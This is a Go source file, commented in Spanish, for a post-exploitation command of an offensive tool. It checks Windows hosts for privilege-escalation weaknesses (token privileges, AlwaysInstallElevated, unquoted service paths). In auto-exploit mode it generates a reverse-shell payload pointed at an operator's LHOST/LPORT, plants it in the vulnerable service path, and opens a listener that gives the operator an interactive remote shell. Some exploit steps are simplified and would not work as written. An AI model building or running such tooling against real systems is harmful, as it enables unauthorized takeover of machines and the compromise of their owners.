// FICHERO: postex.go
package main

import (
	"bufio"
	//"bytes"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	//"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/spf13/cobra"
)

// CheckResult almacena el resultado de una comprobación de escalada.
type CheckResult struct {
	Name         string   `json:"name"`
	Description  string   `json:"description"`
	IsVulnerable bool     `json:"is_vulnerable"`
	Details      string   `json:"details"`
	ExploitPlan  []string `json:"exploit_plan"` // Secuencia de comandos a ejecutar
}

func NewPostExCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "postex",
		Short: "Ejecuta módulos de post-explotación para Windows",
		Long:  "Un conjunto de herramientas para la escalada de privilegios y otras técnicas de post-explotación en Windows.",
	}
	// Solo añadimos comandos que funcionen en Windows
	if runtime.GOOS == "windows" {
		cmd.AddCommand(newEscalateCmd())
	}
	return cmd
}

// newEscalateCmd crea el comando 'postex escalate'.
func newEscalateCmd() *cobra.Command {
	var autoExploit bool
	var lhost, lport string

	cmd := &cobra.Command{
		Use:   "escalate",
		Short: "Ejecuta un escaneo automático de vectores de escalada de privilegios en Windows",
		Long: `Realiza una batería de comprobaciones en busca de misconfiguraciones comunes 
(servicios, registro, etc.) y, si se usa --auto-exploit, intentará explotar el primer vector fiable que encuentre.`,
		Run: func(cmd *cobra.Command, args []string) {
			if autoExploit && (lhost == "" || lport == "") {
				log.Fatal("Error: El modo auto-exploit requiere que especifiques tu IP de escucha (--lhost) y puerto (--lport) para recibir el shell.")
			}
			runEscalationScan(autoExploit, lhost, lport)
		},
	}
	cmd.Flags().BoolVarP(&autoExploit, "auto-exploit", "x", false, "Intenta explotar automáticamente el primer vector encontrado (¡PELIGROSO!)")
	cmd.Flags().StringVar(&lhost, "lhost", "", "Tu IP de escucha para el reverse shell en modo auto-exploit")
	cmd.Flags().StringVar(&lport, "lport", "4444", "Tu puerto de escucha para el reverse shell en modo auto-exploit")

	return cmd
}

// runEscalationScan es el orquestador principal.
func runEscalationScan(autoExploit bool, lhost, lport string) {
	log.Println("Iniciando escaneo agresivo de vectores de escalada de privilegios en Windows...")

	checks := []func() CheckResult{
		checkCurrentUserPrivs,
		checkAlwaysInstallElevated,
		checkServicesUnquotedPath,
		checkServicesPermissions,
	}

	resultsChan := make(chan CheckResult, len(checks))
	var wg sync.WaitGroup

	for _, check := range checks {
		wg.Add(1)
		go func(ch func() CheckResult) {
			defer wg.Done()
			resultsChan <- ch()
		}(check)
	}
	wg.Wait()
	close(resultsChan)

	var vulnerableResults []CheckResult
	fmt.Println("\n--- ANÁLISIS DE VECTORES DE ESCALADA ---")
	for result := range resultsChan {
		if result.IsVulnerable {
			fmt.Printf("\n[!] ¡VECTOR ENCONTRTRADO!: %s\n", result.Name)
			fmt.Printf("    Descripción: %s\n", result.Description)
			fmt.Printf("    Detalles: %s\n", result.Details)
			if len(result.ExploitPlan) > 0 {
				fmt.Printf("    Sugerencia de Explotación: %s\n", result.ExploitPlan[0])
			}
			vulnerableResults = append(vulnerableResults, result)
		}
	}
	
	if len(vulnerableResults) == 0 {
		log.Println("Escaneo completado. No se encontraron vectores de escalada de privilegios obvios.")
		return
	}
	fmt.Println("--------------------------------------")
	
	if autoExploit {
		log.Println("\n--- MODO AUTO-EXPLOIT ACTIVADO ---")
		exploitToRun := vulnerableResults[0]
		log.Printf("Seleccionado el vector más prometedor: '%s'", exploitToRun.Name)
		
		go startNativeListener(lport)
		time.Sleep(2 * time.Second)

		executeExploitPlan(exploitToRun, lhost, lport)
	}
}

func executeExploitPlan(result CheckResult, lhost, lport string) {
	log.Println("Iniciando plan de explotación...")
	for i, commandTemplate := range result.ExploitPlan {
		command := strings.Replace(commandTemplate, "{LHOST}", lhost, -1)
		command = strings.Replace(command, "{LPORT}", lport, -1)
		
		log.Printf("Ejecutando paso %d/%d: %s", i+1, len(result.ExploitPlan), command)
		parts := strings.Fields(command)
		cmd := exec.Command(parts[0], parts[1:]...)
		output, err := cmd.CombinedOutput()
		if err != nil {
			log.Printf("  -> El paso falló: %v", err)
			log.Printf("  -> Salida: %s", string(output))
			log.Println("Plan de explotación abortado.")
			return
		}
		log.Println("  -> Paso completado con éxito.")
	}
	log.Println("¡Plan de explotación finalizado! Revisa tu listener para ver si has recibido un shell.")
}

// --- MÓDULOS DE CHEQUEO INDIVIDUALES ---

func checkCurrentUserPrivs() CheckResult {
	result := CheckResult{Name: "Privilegios del Usuario Actual", Description: "Enumera los privilegios del token del proceso actual usando 'whoami /priv'."}
	cmd := exec.Command("whoami", "/priv")
	output, err := cmd.CombinedOutput()
	if err != nil {
		result.Details = fmt.Sprintf("No se pudo ejecutar 'whoami /priv': %v", err)
		return result
	}
	outputStr := string(output)
	result.Details = outputStr
	if strings.Contains(outputStr, "SeImpersonatePrivilege") || strings.Contains(outputStr, "SeAssignPrimaryTokenPrivilege") {
		result.IsVulnerable = true
		result.ExploitPlan = []string{"Este usuario es vulnerable a ataques de suplantación de token (ej. Juicy Potato, PrintSpoofer)."}
	}
	return result
}

func checkAlwaysInstallElevated() CheckResult {
	result := CheckResult{Name: "AlwaysInstallElevated", Description: "Comprueba si las claves de registro permiten a cualquier usuario instalar paquetes .msi con privilegios de SYSTEM."}
	cmd := exec.Command("powershell", "-Command", "try { $key1 = Get-ItemProperty 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\Installer' -Name 'AlwaysInstallElevated' -ErrorAction Stop; $key2 = Get-ItemProperty 'HKCU:\\Software\\Policies\\Microsoft\\Windows\\Installer' -Name 'AlwaysInstallElevated' -ErrorAction Stop; if ($key1.AlwaysInstallElevated -eq 1 -and $key2.AlwaysInstallElevated -eq 1) { exit 0 } } catch { exit 1 }")
	if err := cmd.Run(); err == nil {
		result.IsVulnerable = true
		result.Details = "Ambas claves de registro HKLM y HKCU para 'AlwaysInstallElevated' están establecidas a 1."
		result.ExploitPlan = []string{"Genera un payload .msi con msfvenom y ejecútalo con 'msiexec /i payload.msi /quiet'."}
	}
	return result
}

func checkServicesUnquotedPath() CheckResult {
	result := CheckResult{Name: "Unquoted Service Paths", Description: "Busca servicios cuya ruta al ejecutable contiene espacios y no está entre comillas."}
	cmd := exec.Command("powershell", "-Command", "Get-CimInstance -ClassName Win32_Service | Where-Object { $_.PathName -notlike '\"*' -and $_.PathName -like '* *' } | Select-Object -ExpandProperty PathName | Select-Object -First 1")
	output, _ := cmd.CombinedOutput()
	pathName := strings.TrimSpace(string(output))
	if pathName == "" { return result }
	
	parts := strings.Split(pathName, " ")
	if len(parts) < 2 { return result }
	
	vulnerableExe := parts[0] + ".exe"
	if !strings.HasPrefix(strings.ToLower(vulnerableExe), "c:\\") {
		return result // Evitar rutas extrañas
	}

	result.IsVulnerable = true
	result.Details = "Servicio encontrado con ruta sin comillas: " + pathName
	result.ExploitPlan = []string{
		fmt.Sprintf("scaner-pro payload generate -t powershell -L {LHOST} -P {LPORT} | Out-File -Encoding ASCII payload.ps1"),
		fmt.Sprintf("move payload.ps1 %s", vulnerableExe), // Esto es una simplificación, requeriría permisos de escritura
		"echo 'Paso manual: Reinicia el servicio o la máquina para activar el payload.'",
	}
	return result
}

func checkServicesPermissions() CheckResult {
	result := CheckResult{Name: "Insecure Service Permissions", Description: "Busca servicios que los usuarios autenticados pueden modificar."}
	result.Details = "Chequeo no implementado en esta versión."
	return result
}

// --- LISTENER NATIVO EN GO ---
func startNativeListener(port string) {
	log.Printf("[+] Iniciando listener nativo en el puerto %s...", port)
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		log.Printf("Error fatal: No se pudo iniciar el listener en el puerto %s: %v", port, err)
		return
	}
	defer listener.Close()
	
	log.Printf("Esperando conexión entrante...")
	conn, err := listener.Accept()
	if err != nil {
		log.Printf("Error al aceptar la conexión: %v", err)
		return
	}
	
	log.Printf("\n\n[!] ¡CONEXIÓN RECIBIDA DESDE %s!", conn.RemoteAddr())
	log.Println("--- INICIO DE SHELL INTERACTIVA ---")
	
	// Salir del programa cuando el shell termine
	done := make(chan bool)
	
	// Goroutine para leer desde la conexión remota y escribir en nuestra consola
	go func() {
		io.Copy(os.Stdout, conn)
		done <- true
	}()
	
	// Bucle principal para leer desde nuestra consola y escribir en la conexión remota
	go func() {
		// Crear un nuevo reader para el Stdin por si acaso
		// Esto ayuda a que el shell sea más interactivo
		reader := bufio.NewReader(os.Stdin)
		for {
			text, _ := reader.ReadString('\n')
			conn.Write([]byte(text))
		}
	}()

	<-done // Esperar a que la conexión se cierre
	log.Println("--- FIN DE SHELL INTERACTIVA ---")
}